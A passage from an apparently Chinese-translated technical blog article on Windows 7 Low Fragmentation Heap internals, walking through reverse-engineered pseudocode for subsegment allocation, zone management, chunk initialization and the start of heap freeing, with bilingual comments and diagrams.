UserBlockCacheIndex;</span><br><span class="line"><span class="keyword">if</span>(AllocAmount &gt; <span class="number">0x78000</span>)</span><br><span class="line">    AllocAmount = <span class="number">0x78000</span>;</span><br><span class="line"></span><br><span class="line">UserBlock = RtlAllocateHeap(LFH‐&gt;Heap, <span class="number">0x800000</span>, AllocAmount ‐ <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span>(UserBlock)</span><br><span class="line">&#123;</span><br><span class="line">    LFH‐&gt;CacheAllocs++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Assign the _HEAP_USERDATA_HEADER‐&gt;SizeIndex</span></span><br><span class="line">    <span class="comment">//赋值_HEAP_USERDATA_HEADER‐&gt;SizeIndex</span></span><br><span class="line">    *(UserBlock+<span class="number">8</span>) = UserBlockCacheIndex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> UserBlock;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;尽管已经分配了内存，但是LFH还没有准备好使用它。它必须首先与_HEAP_SUBSEGMENT耦合。该SubSegment要么是先前被删除的一个，要么创建于_LFH_BLOCK_ZONE链表取回的地址上。</p><p style="text-align:center;font-weight:bold">Listing 20. LFH Pre-SubSegment initialization setup</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> UserDataBytesSize = <span class="number">1</span> &lt;&lt; UserData‐&gt;AvailableBlocks;</span><br><span class="line"><span class="keyword">if</span>(UserDataBytesSize &gt; <span class="number">0x78000</span>)</span><br><span class="line">    UserDataBytesSize = <span class="number">0x78000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> UserDataAllocSize = UserDataBytesSize ‐ <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Increment SegmentCreate to denote a new SubSegment created</span></span><br><span class="line"><span class="comment">//递增SegmentCreate来指示一个新的SubSegment被创建了</span></span><br><span class="line">InterlockedExchangeAdd(&amp;LFH‐&gt;SegmentCreate, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">DeletedSubSegment = ExInterlockedPopEntrySList(HeapLocalData);</span><br><span class="line">_HEAP_SUBSEGMENT *NewSubSegment = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>(DeletedSubSegment)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// if there are any deleted subsegments, use them</span></span><br><span class="line">    <span class="comment">// 如果有被删除的subsegments，就使用它</span></span><br><span class="line">    NewSubSegment = (_HEAP_SUBSEGMENT*)(DeletedSubSegment ‐ <span class="number">0x18</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    NewSubSegment = RtlpLowFragHeapAllocateFromZone(LFH, LocalDataIndex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//return failure use back‐end</span></span><br><span class="line">    <span class="comment">//返回失败，使用后端</span></span><br><span class="line">    <span class="keyword">if</span>(!NewSubsegment)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//this function will setup the _HEAP_SUBSEGMENT structure</span></span><br><span class="line"><span class="comment">//and check out the data in 'UserData' to be of HeapBucket‐&gt;SizeIndex chunks</span></span><br><span class="line"><span class="comment">//该函数会设置_HEAP_SUBSEGMENT结构体,并检查'UserData'中的数据是否为HeapBucket‐&gt;SizeIndex Chunks</span></span><br><span class="line">RtlpSubSegmentInitialize(LFH,</span><br><span class="line">                         NewSubSegment,</span><br><span class="line">                         UserBlock,</span><br><span class="line">                         RtlpBucketBlockSizes[HeapBucket‐&gt;SizeIndex],</span><br><span class="line">                         UserDataAllocSize,</span><br><span class="line">                         HeapBucket);</span><br><span class="line"></span><br><span class="line"><span class="comment">//each UserBlock starts with the same sig</span></span><br><span class="line"><span class="comment">//每个UserBlock一开始都有着相同的标记</span></span><br><span class="line">UserBlock‐&gt;Signature = <span class="number">0xF0E0D0C0</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;RtlpLowFragHeapAllocateFromZone()具有二重效用：要么为_HEAP_SUBSEGMENT找到一个指针，要么为后续的地址跟踪创建多个_LFH_BLOCK_ZONE结构。</p><p>&emsp;&emsp;该函数首先会检查是否存在有效的_LFH_BLOCK_ZONE结构保存了一个SubSegment使用的地址。如果没有或者超出了设计的限制，那么就会分配0x3F8(1016)字节的内存来存储新的_LFH_BLOCK_ZONE对象。下面的代码展示了RtlpLowFragHeapAllocateFromZone()的经典工作情景。</p><p style="text-align:center;font-weight:bold">Listing 21. RtlpLowFragHeapAllocateFromZone</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">_LFH_BLOCK_ZONE *CrtZone = LFH‐&gt;LocalData[LocalDataIndex]‐&gt;CrtZone;</span><br><span class="line">_LFH_BLOCK_ZONE *CrtZoneFlink = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//Flink == NULL =&gt; create initial zones</span></span><br><span class="line">            CrtZoneFlink = CrtZone‐&gt;ListEntry‐&gt;Flink;</span><br><span class="line">            <span class="keyword">if</span>(!CrtZone‐&gt;Flink)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">void</span> *FreePointer = CrtZoneFlink‐&gt;FreePointer;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//This will increment it to the next SubSegment</span></span><br><span class="line">            <span class="comment">//这会递增到下一个SubSegment</span></span><br><span class="line">            <span class="keyword">void</span> *FreePointer_New = FreePointer + LFH‐&gt;ZoneBlockSize;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//if we've exceeded the limit create more zones</span></span><br><span class="line">            <span class="comment">//如果超出了限制，就创建更多的zones</span></span><br><span class="line">            <span class="keyword">if</span>(FreePointer_New &gt;= CrtZoneFlink‐&gt;Limit)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//InterlockedCompareExchange</span></span><br><span class="line">            <span class="comment">//loop if this fails</span></span><br><span class="line">            <span class="comment">//如果失败就一直循环，原子操作</span></span><br><span class="line">            <span class="keyword">if</span>(CompareExchange(&amp;CrtZoneFlink‐&gt;FreePointer,FreePointer_New))</span><br><span class="line">                <span class="keyword">return</span> FreePointer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(CrtZoneFlink == CrtZone‐&gt;ListEntry.Flink)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//this will effectively give us 31 _LFH_BLOCK_ZONE structures to use for keeping track of userdata</span></span><br><span class="line">    <span class="comment">//这将有效的给我们31个_LFH_BLOCK_ZONE结构体，用于跟踪用户数据</span></span><br><span class="line">    <span class="keyword">void</span> *NewLFHBlockZone = RtlAllocateHeap(LFH‐&gt;Heap, <span class="number">0x80000</span>u, <span class="number">0x3F8</span>u);</span><br><span class="line">    <span class="keyword">if</span>(!NewLFHBlockZone)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if the CrtZone's ListEntry is empty</span></span><br><span class="line">    <span class="comment">//如果CrtZone的ListEntry是空的</span></span><br><span class="line">    <span class="keyword">if</span>(CrtZoneFlink == CrtZone‐&gt;ListEntry.Flink)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//link in the newly created structure into the LFH‐&gt;SubSegmentZones</span></span><br><span class="line">        <span class="comment">//把新创建的结构链入到LFH‐&gt;SubSegmentZones</span></span><br><span class="line">        LinkInBlockZone(LFH, NewLFHBlockZone);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//points to the end of the allocations</span></span><br><span class="line">        <span class="comment">//指向分配的末尾</span></span><br><span class="line">        NewLFHBlockZone‐&gt;Limit = NewLFHBlockZone + <span class="number">0x3F8</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//sizeof(_LFH_BLOCK_ZONE) == 0x10</span></span><br><span class="line">        <span class="keyword">char</span> *AlignedZone = RoundAlign(NewLFHBlockZone + <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">        NewLFHBlockZone‐&gt;FreePointer = AlignedZone;</span><br><span class="line">        CrtZone‐&gt;ListEntry.Flink = NewLFHBlockZone;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if we failed, free the data</span></span><br><span class="line">    <span class="comment">// 如果失败了，就释放数据</span></span><br><span class="line">    RtlFreeHeap(LFH‐&gt;Heap, <span class="number">0x800000</span>, NewLFHBlockZone);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;尽管上面的代码不太好理解，但它仅考虑了一些设计目的。最内层的循环保证了FreePointers的原子交换，避免了多线程之间的条件竞争。最外层的循环保证了函数在资源耗尽时创建新的BlockZones。</p><p>&emsp;&emsp;当通过RtlpLowFragHeapAllocateFromZone()获取到地址时，就可以在RtlpSubSegmentInitialize()中初始化SubSegment。顾名思义，它负责初始化_HEAP_SUBSEGMENT，使用了一大堆参数，比如新创建的SubSegment(NewSubSegment)，最近分配的内存(UserBlock)，可用内存量(UserDataAllocSize)以及要创建的Chunks的大小(HeapBucket/BucketBytesSize)。</p><p>&emsp;&emsp;RtlpSubSegmentInitialize()首先基于HeapBucket大小获取LocalSegmentInfo和LocalData结构。在确保具体的Affinity状态后，它会精准地计算该UserBlock有多少个可用的Chunks。一旦确定要创建的Chunks的数量，他就会迭代内存的大块Chunk，为每个Chunk写入一个头部。最后_INTERLOCK_SEQ的初始值被设置为Depth为NumberOfChunks，而FreeEntryOffset为0x2。</p><p style="text-align:center;font-weight:bold">Listing 22. RtlpSubSegmentInitialize</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *UserBlockData = UserBlock + <span class="keyword">sizeof</span>(_HEAP_USERDATA_HEADER);</span><br><span class="line"></span><br><span class="line">_HEAP_LOCAL_SEGMENT_INFO *LocalSegmentInfo =</span><br><span class="line">    LFH‐&gt;LocalData[NewSubSegment‐&gt;AffinityIndex]‐&gt;SegmentInfo[HeapBucket‐&gt;SizeIndex];</span><br><span class="line"></span><br><span class="line">_HEAP_LOCAL_DATA *LocalData =</span><br><span class="line">    LFH‐&gt;LocalData[NewSubSegment‐&gt;AffinityIndex]‐&gt;Segmentinfo[HeapBucket‐&gt;SizeIndex]‐&gt;LocalData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!((HeapBucket‐&gt;Affinity &gt;&gt; <span class="number">1</span>) &amp; <span class="number">3</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> TotalBucketByteSize = BucketByteSize + <span class="keyword">sizeof</span>(_HEAP_ENTRY);</span><br><span class="line">    <span class="keyword">int</span> BucketBlockSize = TotalBucketByteSize / <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sizeof(_HEAP_USERDATA_HEADER) == 0x10</span></span><br><span class="line">    <span class="keyword">int</span> NumberOfChunks = (UserDataAllocSize ‐ <span class="number">0x10</span>) / TotalBucketByteSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//skip past the header, so we can start chunking</span></span><br><span class="line">    <span class="comment">//跳过头部，我们可以开始Chunking</span></span><br><span class="line">    <span class="keyword">void</span> *pUserData = UserBlock + <span class="keyword">sizeof</span>(_HEAP_USERDATA_HEADER);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//assign the SubSegment</span></span><br><span class="line">    <span class="comment">//赋值给SubSegment</span></span><br><span class="line">    UserBlock‐&gt;SubSegment = NewSubSegment;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sizeof(_HEAP_USERDATA_HEADER) == 0x10 (2 blocks)</span></span><br><span class="line">    <span class="keyword">int</span> SegmentOffset = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    _INTERLOCK_SEQ AggrExchg_New;</span><br><span class="line">    AggrExchg_New.FreeEntryOffset = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(NumberOfChunks)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> NumberOfChunksItor = NumberOfChunks;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            SegmentOffset += BucketBlockSize;</span><br><span class="line">            pUserData = UserBlockData;</span><br><span class="line">            UserBlockData += BucketByteSize;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//next FreeEntryOffset</span></span><br><span class="line">            *(WORD*)(pUserData + <span class="number">8</span>) = SegmentOffset;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Set _HEAP_ENTRY.LFHFlags</span></span><br><span class="line">            *(BYTE*)(pUserData + <span class="number">6</span>) = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Set _HEAP_ENTRY.UnusedBytes</span></span><br><span class="line">            *(BYTE*)(pUserData + <span class="number">7</span>) = <span class="number">0x80</span>;</span><br><span class="line"></span><br><span class="line">            EncodeDWORD(LFH, pUserData)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(NumberOfChunksItor‐‐);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//‐1 indicates last chunk in the UserBlock (_HEAP_USERDATA_HEADER)</span></span><br><span class="line">    <span class="comment">//‐1表示UserBlock中的最后一个chunk</span></span><br><span class="line">    *(WORD*)(pUserData + <span class="number">8</span>) = ‐<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Sets all the values for this subsegment</span></span><br><span class="line">    <span class="comment">//为该subsegment设置所有的值</span></span><br><span class="line">    InitSubSegment(NewSubSegment);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//updates the bucket counter to reflect NumberOfChunk as total blocks and sets the SubSegmentCount</span></span><br><span class="line">    <span class="comment">//更新bucket计数器，以反映NumberOfChunk作为总块数，并设置SubSegmentCount</span></span><br><span class="line">    UpdateBucketCounters(LocalSegmentInfo);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//will be atomically assigned to the NewSubSegment's _INTERLOCK_SEQ</span></span><br><span class="line">    <span class="comment">//将原子的对NewSubSegment的_INTERLOCK_SEQ结构赋值</span></span><br><span class="line">    AggrExchg_New.Depth = NumberOfChunks;</span><br><span class="line">    AggrExchg_New.Sequence = AggrExchg_Saved.Sequence + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//InterlockedCompareExchange64</span></span><br><span class="line">    AtomicSwap(&amp;NewSubSegment‐&gt;AggregateExchg, AggrExchg_New);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;最后，在UserBlocks被分配以后，对SubSegment赋值并初始化，LFH就可以设置ActiveSubsegment为刚刚初始化的那个。它会使用一些锁机制进行操作，最终原子地对ActiveSubsegment赋值。最后执行流将返回到Listing 17的点。</p><p style="text-align:center;font-weight:bold">Listing 23. ActiveSubsegment assignment</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//now used for LFH allocation for a specific bucket size</span></span><br><span class="line"><span class="comment">//现在为特定bucket大小做LFH分配</span></span><br><span class="line">AtomicSwap(&amp;HeapLocalSegmentInfo‐&gt;ActiveSegment, NewSubSegment);</span><br></pre></td></tr></table></figure><h4 id="Overview-概览-2"><a href="#Overview-概览-2" class="headerlink" title="Overview(概览)"></a>Overview(概览)</h4><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Front-end_allocation.png" alt="Front-end allocation"></p><p style="text-align:center;font-weight:bold">Diagram 5. Front-end allocation</p><h4 id="Example-示例"><a href="#Example-示例" class="headerlink" title="Example(示例)"></a>Example(示例)</h4><p>&emsp;&emsp;想要完整理解分配过程的最佳方法就是通过实例来分析。我们假定LFH已经被激活，并且我们正在处理第一个分配请求，该请求将由前端分配器完成。当收到0x28(40)字节分配请求时，因为头部大小的关系，大小会调整为0x30(48)字节(0x6 blocks)。我们还假定将使用_HEAP_LOCAL_DATA结构中SegmentInfo[0x6]处的ActiveSubSegment。</p><blockquote><p>备注：LFH-&gt;LocalData[0]-&gt;SegmentInfo[0x6]-&gt;ActiveSubsegment-&gt;UserBlocks</p></blockquote><p>&emsp;&emsp;根据上面的魔法公式，我们可以推断出对0x30字节来说有0x2A个Chunks(对应Depth)。初始化偏移量为0x2，因为_HEAP_USERDATA_HEADER是0x10字节。</p><p>&emsp;&emsp;UserBlock中的每个Chunk都包含一个8字节头部，前4个字节被编码过，调用过程返回的是其后的n字节用户可写的内存。用户可写的前两个字节赋值给了_INTERLOCK_SEQ的NextOffset。</p><p>&emsp;&emsp;每个Offset都是从UserBlock Chunk的开头开始计算的，以blocks为单位。下一个可用Chunk的字节Offset将是UserBlocks + FreeEntryOffset * 0x8。</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Full_UserBlock_for_Bucket_0x6.png" alt="Full UserBlock for Bucket 0x6"></p><p style="text-align:center;font-weight:bold">Diagram 6. Full UserBlock for Bucket 0x6</p><p>&emsp;&emsp;进行初始分配后，Depth和Offset都会进行更新，以反映UserBlock中的下一个可用块。内存实际上并没有移动，只是索引有所不同，下图将展示一次分配后的可用内存状态。注意Offset的值是之前存储在Chunk中的那个(即NextOffset)，并且Depth减少0x1; 表示我们已经使用了一个块，并且剩余了0x29。</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/UserBlock_after_the_1st_allocation_for_0x30_bytes.png" alt="UserBlock after the 1st allocation for 0x30 bytes"></p><p style="text-align:center;font-weight:bold">Diagram 7. UserBlock after the 1st allocation for 0x30 bytes</p><p>&emsp;&emsp;在第二次分配之后，偏移量UserBlock+0xE将成为下一个空闲块。此后，Userblock+0x14将是下一个空闲块，依此类推。它会不断递增Offset，递减Depth，直到Depth等于0为止。这表示需要为另一个UserBlock分配更多的内存。下图是0x30字节UserBlock两次连续分配之后的状态。我们将在释放(Freeing)一节中看到这些块是如何被释放的。</p><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/UserBlock_after_the_2nd_consecutive_allocation_for_0x30_bytes.png" alt="UserBlock after the 2nd consecutive allocation for 0x30 bytes"></p><p style="text-align:center;font-weight:bold">Diagram 8. UserBlock after the 2nd consecutive allocation for 0x30 bytes</p><h3 id="Freeing-释放"><a href="#Freeing-释放" class="headerlink" title="Freeing(释放)"></a>Freeing(释放)</h3><p>&emsp;&emsp;现在我们已经对Windows 7的内存分配有了基本的了解，我们可以讨论它是如何释放内存的了。使用中的Chunk会被应用程序释放，并交还给堆管理器。此过程从RtlFreeHeap()开始，它把heap,flags和待释放的chunk作为参数。该函数首先鉴别该chunk是否是可以释放的(free-able)，然后检查该Chunk的头部以确定应该由哪个堆管理器负责释放它。</p><p style="text-align:center;font-weight:bold">Listing 24. RtlFreeHeap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ChunkHeader = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//it will not operate on NULL</span></span><br><span class="line"><span class="comment">//如果为NULL，将无需操作</span></span><br><span class="line"><span class="keyword">if</span>(ChunkToFree == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ensure the chunk is 8‐byte aligned</span></span><br><span class="line"><span class="comment">//确保要释放的Chunk的地址8字节对齐</span></span><br><span class="line"><span class="keyword">if</span>(!(ChunkToFree &amp; <span class="number">7</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//subtract the sizeof(_HEAP_ENTRY)</span></span><br><span class="line">    <span class="comment">//剪掉sizeof(_HEAP_ENTRY)</span></span><br><span class="line">    ChunkHeader = ChunkToFree ‐ <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//use the index to find the size</span></span><br><span class="line">    <span class="comment">//使用index来寻找大小</span></span><br><span class="line">    <span class="keyword">if</span>(ChunkHeader‐&gt;UnusedBytes == <span class="number">0x5</span>)</span><br><span class="line">        ChunkHeader ‐= <span class="number">0x8</span> * (BYTE)ChunkToFreeHeader‐&gt;SegmentOffset;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    RtlpLogHeapFailure();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//position 0x7 in the header denotes whether the chunk was allocated via</span></span><br><span class="line"><span class="comment">//the front‐end or the back‐end (non‐encoded ;) )</span></span><br><span class="line"><span class="comment">//头部的0x7位置指示了chunk是前端还是后端分配的(未编码)</span></span><br><span class="line"><span class="keyword">if</span>(ChunkHeader‐&gt;UnusedBytes &amp; <span class="number">0x80</span>)</span><br><span class="line">    RtlpLowFragHeapFree(Heap, ChunkToFree);                     <span class="comment">// 前端释放器</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    RtlpFreeHeap(Heap, Flags | <span class="number">2</span>, ChunkHeader, ChunkToFree);    <span class="comment">// 后端释放器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><h3 id="Back-end-Freeing-后端释放器"><a href="#Back-end-Freeing-后端释放器" class="headerlink" title="Back-end Freeing(后端释放器)"></a>Back-end Freeing(后端释放器)</h3><p>&emsp;&emsp;后端堆管理器负责处理那些前端堆管理器处理不了的内存，无论是因为大小还是因为LFH的缺失。所有超过0xFE00 blocks的分配都是由VirtualAlloc()/VirtualFree()直接处理，所有超过0x800 blocks的以及那些不能被前端处理的都由后端堆管理器处理。</p><h4 id="RtlpFreeHeap"><a href="#RtlpFreeHeap" class="headerlink" title="RtlpFreeHeap"></a>RtlpFreeHeap</h4><p>&emsp;&emsp;RtlpFreeHeap()以_HEAP, Flags, ChunkHeader和ChunkToFree作为参数。他将首先试图解码Chunk头部(如果被编码了的话)，然后在BlocksIndex内找到一个合适的ListHint。如果无法找到一个足够容纳待释放块的ListHint索引，它将使用BlocksIndex-&gt;ArraySize-1作为ListHint 的索引。</p><p style="text-align:center;font-weight:bold">Listing 25. RtlpFreeHeap BlocksIndex search</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(Heap‐&gt;EncodeFlagMask)</span><br><span class="line">    DecodeAndValidateChecksum(ChunkHeader);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ChunkSize = ChunkHeader‐&gt;Size;</span><br><span class="line">_HEAP_LIST_LOOKUP *BlocksIndex = Heap‐&gt;BlocksIndex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//if the chunk will fit in this BlocksIndex, break out</span></span><br><span class="line">    <span class="comment">//如果Chunk匹配该BlocksIndex，跳出去</span></span><br><span class="line">    <span class="keyword">if</span>(ChunkSize &lt; BlocksIndex‐&gt;ArraySize)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if the chunk is too big for this blocksindex and there is NOT</span></span><br><span class="line">    <span class="comment">//and extended lookup, then free onto FreeList[BlocksIndex‐&gt;ArraySize‐1]</span></span><br><span class="line">    <span class="comment">//如果chunk太大了，且后面没有扩展了，就释放到FreeList[BlocksIndex‐&gt;ArraySize‐1]</span></span><br><span class="line">    <span class="keyword">if</span>(!BlocksIndex‐&gt;ExtendedLookup)</span><br><span class="line">    &#123;</span><br><span class="line">        ChunkSize = BlocksIndex‐&gt;ArraySize ‐ <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//next item in the linked list</span></span><br><span class="line">    <span 